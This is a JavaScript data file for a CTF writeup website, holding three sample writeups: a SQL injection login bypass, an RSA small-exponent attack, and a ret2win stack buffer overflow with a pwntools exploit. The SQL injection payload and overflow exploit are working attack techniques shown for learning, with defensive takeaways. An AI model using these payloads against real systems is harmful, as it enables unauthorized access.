/* ================================================================
   data/writeups.js
   ================================================================

   HOW TO ADD A WRITEUP:
   1. Copy one of the objects below
   2. Paste it at the TOP of the array (newest first)
   3. Fill in all the fields
   4. Write your writeup in the `content` field using Markdown syntax
   5. Save the file

   FIELDS:
   - id:         Unique string, no spaces (used in URL: writeup.html?id=YOUR_ID)
   - title:      Challenge name
   - ctf:        Name of the CTF event
   - category:   One of: Web, Crypto, Pwn, Rev, Forensics, Misc
   - difficulty: Easy / Medium / Hard
   - points:     Point value (optional, set to null to hide)
   - date:       Display date string, e.g. "January 2025"
   - summary:    1–2 sentence description shown on the listing page
   - content:    Full writeup in MARKDOWN format (see examples below)

   MARKDOWN TIPS for content:
   - ## Heading 2
   - ### Heading 3  
   - **bold**, *italic*
   - `inline code`
   - ```python ... ``` for code blocks (auto-highlighted)
   - > blockquote
   - - bullet list
   - [link text](url)

================================================================ */

const WRITEUPS_DATA = [

  // ================================================================
  // EXAMPLE WRITEUP 1 — EDIT OR REPLACE THIS
  // ================================================================
  {
    id:         'sql-injection-login',
    title:      'SQL Injection Bypass — Login Form',
    ctf:        'ExampleCTF 2025',
    category:   'Web',
    difficulty: 'Easy',
    points:     100,
    date:       'January 2025',
    summary:    'Classic SQL injection bypass on a login form using a simple OR payload. First blood on the web category.',

    content: `
## Challenge Description

The challenge presented a standard login form. No source code was provided. The goal was to log in as the admin user and retrieve the flag.

## Reconnaissance

Opening the login page, I noticed no client-side obfuscation and the form had two standard fields: \`username\` and \`password\`.

I started by testing for SQL injection with a simple payload:

\`\`\`
Username: admin'--
Password: anything
\`\`\`

The server returned a different error message compared to a random username, which told me:
1. The backend was likely SQL-based
2. Input was not properly sanitized

## Exploitation

I tried the classic OR bypass:

\`\`\`sql
' OR '1'='1'--
\`\`\`

Using this as the username with any password, the server authenticated me as the first user in the database — which happened to be \`admin\`.

The login succeeded and the page displayed:

\`\`\`
Welcome, admin!
FLAG{sql_1nj3ct10n_is_classic}
\`\`\`

## Takeaways

- Always use parameterized queries / prepared statements
- User input should never be interpolated directly into SQL
- Error messages that differ between valid/invalid usernames reveal user enumeration vulnerabilities

## Flag

\`FLAG{sql_1nj3ct10n_is_classic}\`
    `,
  },

  // ================================================================
  // EXAMPLE WRITEUP 2 — EDIT OR REPLACE THIS
  // ================================================================
  {
    id:         'rsa-small-exponent',
    title:      'RSA Small Exponent Attack',
    ctf:        'ExampleCTF 2025',
    category:   'Crypto',
    difficulty: 'Medium',
    points:     250,
    date:       'January 2025',
    summary:    'RSA challenge where e=3 and the ciphertext was small enough that cube root directly recovers the plaintext.',

    content: `
## Challenge Description

We were given a file containing:

\`\`\`
n = (large number)
e = 3
c = (ciphertext)
\`\`\`

## Analysis

When \`e\` is small and the message \`m\` is not padded, if \`m^e < n\`, then the ciphertext is simply \`m^e\` with no modular reduction. This means we can recover \`m\` by computing the integer cube root of \`c\`.

## Solution

\`\`\`python
from gmpy2 import iroot

n = 0x... # paste n here
e = 3
c = 0x... # paste c here

# Try taking the integer cube root
m, exact = iroot(c, e)

if exact:
    print(bytes.fromhex(hex(m)[2:]))
else:
    print("Not exact — padding may be involved")
\`\`\`

Running the script:

\`\`\`
$ python3 solve.py
b'FLAG{sm4ll_3xp0n3nt_rsa}'
\`\`\`

## Takeaways

- RSA with small \`e\` and no padding (PKCS#1) is trivially broken
- Always use proper padding (OAEP)
- \`e = 65537\` is the standard for a reason

## Flag

\`FLAG{sm4ll_3xp0n3nt_rsa}\`
    `,
  },

  // ================================================================
  // EXAMPLE WRITEUP 3
  // ================================================================
  {
    id:         'buffer-overflow-ret',
    title:      'Stack Buffer Overflow — ret2win',
    ctf:        'ExampleCTF 2025',
    category:   'Pwn',
    difficulty: 'Easy',
    points:     150,
    date:       'February 2025',
    summary:    'Classic ret2win buffer overflow. Overwrite saved return address to redirect execution to a win() function.',

    content: `
## Challenge Description

A 64-bit ELF binary with no PIE and no canary. Source code was provided. There's a \`win()\` function that reads and prints the flag but is never called in the normal execution flow.

## Analysis

Looking at the vulnerable function:

\`\`\`c
void vuln() {
    char buf[64];
    gets(buf);  // no bounds checking!
}
\`\`\`

The buffer is 64 bytes. I used \`gdb-pwndbg\` to find the exact offset to RIP:

\`\`\`
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*100)")
...
pwndbg> cyclic -l 0x6161616161616166
72
\`\`\`

Offset to RIP = **72 bytes**.

## Exploit

\`\`\`python
from pwn import *

elf  = ELF('./vuln')
p    = process('./vuln')

win  = elf.symbols['win']
offset = 72

payload = b'A' * offset
payload += p64(win)

p.sendline(payload)
p.interactive()
\`\`\`

## Flag

\`FLAG{r3t_to_w1n_ez}\`
    `,
  },

];
